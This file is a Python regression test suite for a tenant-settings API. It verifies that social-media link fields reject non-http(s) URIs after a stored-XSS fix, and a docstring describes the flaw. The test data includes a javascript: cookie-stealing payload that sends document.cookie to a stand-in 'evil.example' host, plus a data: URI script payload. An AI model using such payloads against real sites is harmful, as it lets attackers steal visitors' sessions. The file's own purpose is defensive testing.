"""PATCH /tenants/settings/ (landing sub-object) — 9th systematic audit
sweep, stored XSS via javascript: URI in tenant social-media links.

TenantLandingSettings.facebook/instagram/twitter/youtube/facebook_url/
twitter_url/linkedin_url (schemas/tenants.py) had no protocol validation
at all. PATCH /tenants/settings/ accepts an arbitrary Dict[str, Any] and
merges it into tenant.settings with zero validation, so any tenant admin
could set e.g. linkedin_url to
"javascript:fetch('https://evil.example/?c='+document.cookie)". Every
public, unauthenticated landing-page template (PublicPageView.tsx,
PremiumFooter.tsx, and the 3 legacy HighSchool/University/DefaultLanding
templates) rendered these fields straight into an <a href={...}> with no
sanitization — a javascript: URI still executes on click even with
target="_blank" rel="noopener noreferrer" (that combo only blocks
window.opener access, not the URI scheme). Fixed on both ends,
defense-in-depth: the frontend now routes every href through sanitizeUrl()
(src/lib/sanitize.ts), and TenantLandingSettings gained a field_validator
rejecting anything but http(s):// — checked HERE, at the actual PATCH
write path (a validator on the Pydantic model alone would only have fired
on the public-read side, silently blanking the whole landing object
instead of rejecting the bad write at its source).
"""
import uuid

import pytest
from conftest import get_test_client

client = get_test_client()

from app.core.database import SessionLocal  # noqa: E402
from app.core.security import create_access_token, get_current_user  # noqa: E402
from app.main import app  # noqa: E402
from app.models.tenant import Tenant  # noqa: E402
from app.models.user import User  # noqa: E402

SETTINGS_URL = "/api/v1/tenants/settings/"


@pytest.fixture(autouse=True)
def _clear_overrides():
    yield
    app.dependency_overrides.pop(get_current_user, None)


def _as(user: dict) -> dict:
    app.dependency_overrides[get_current_user] = lambda: user
    token = create_access_token({"sub": user["id"], "tenant_id": user.get("tenant_id"), "roles": user.get("roles", [])})
    return {"Authorization": f"Bearer {token}"}


def _make_tenant_with_admin() -> tuple:
    tenant_id = str(uuid.uuid4())
    with SessionLocal() as db:
        db.add(Tenant(
            id=tenant_id, name="École JS URI Test", slug=f"js-uri-{tenant_id[:8]}",
            type="primary", country="GN", is_active=True, settings={},
        ))
        db.commit()
    admin_id = str(uuid.uuid4())
    with SessionLocal() as db:
        db.add(User(
            id=admin_id, tenant_id=tenant_id, email=f"{admin_id[:8]}@example.com",
            username=f"admin-{admin_id[:8]}", is_active=True,
        ))
        db.commit()
    return tenant_id, admin_id


XSS_URI = "javascript:fetch('https://evil.example/?c='+document.cookie)"


class TestSocialLinkFieldsRejectNonHttpProtocols:
    @pytest.mark.parametrize("field", [
        "facebook", "instagram", "twitter", "youtube",
        "facebook_url", "twitter_url", "linkedin_url",
    ])
    def test_javascript_uri_is_rejected(self, field):
        tenant_id, admin_id = _make_tenant_with_admin()
        headers = _as({"id": admin_id, "roles": ["TENANT_ADMIN"], "tenant_id": tenant_id})

        resp = client.patch(SETTINGS_URL, json={"landing": {field: XSS_URI}}, headers=headers)
        assert resp.status_code == 422, resp.text

        with SessionLocal() as db:
            tenant = db.get(Tenant, tenant_id)
            assert field not in (tenant.settings or {}).get("landing", {})

    def test_data_uri_is_rejected(self):
        tenant_id, admin_id = _make_tenant_with_admin()
        headers = _as({"id": admin_id, "roles": ["TENANT_ADMIN"], "tenant_id": tenant_id})

        resp = client.patch(
            SETTINGS_URL,
            json={"landing": {"linkedin_url": "data:text/html,<script>alert(1)</script>"}},
            headers=headers,
        )
        assert resp.status_code == 422, resp.text

    def test_https_url_is_accepted(self):
        tenant_id, admin_id = _make_tenant_with_admin()
        headers = _as({"id": admin_id, "roles": ["TENANT_ADMIN"], "tenant_id": tenant_id})

        resp = client.patch(
            SETTINGS_URL,
            json={"landing": {"linkedin_url": "https://linkedin.com/school/test"}},
            headers=headers,
        )
        assert resp.status_code == 200, resp.text

        with SessionLocal() as db:
            tenant = db.get(Tenant, tenant_id)
            assert tenant.settings["landing"]["linkedin_url"] == "https://linkedin.com/school/test"

    def test_empty_social_fields_are_still_accepted(self):
        """Surgical fix — landing settings with no social links configured
        (the common case) must keep saving without error."""
        tenant_id, admin_id = _make_tenant_with_admin()
        headers = _as({"id": admin_id, "roles": ["TENANT_ADMIN"], "tenant_id": tenant_id})

        resp = client.patch(SETTINGS_URL, json={"landing": {"tagline": "Bienvenue"}}, headers=headers)
        assert resp.status_code == 200, resp.text

    def test_non_landing_settings_are_unaffected(self):
        """The validation only inspects the 'landing' sub-object — other
        settings keys (billing config, feature flags, etc.) must keep
        saving exactly as before."""
        tenant_id, admin_id = _make_tenant_with_admin()
        headers = _as({"id": admin_id, "roles": ["TENANT_ADMIN"], "tenant_id": tenant_id})

        resp = client.patch(SETTINGS_URL, json={"someFeatureFlag": True}, headers=headers)
        assert resp.status_code == 200, resp.text
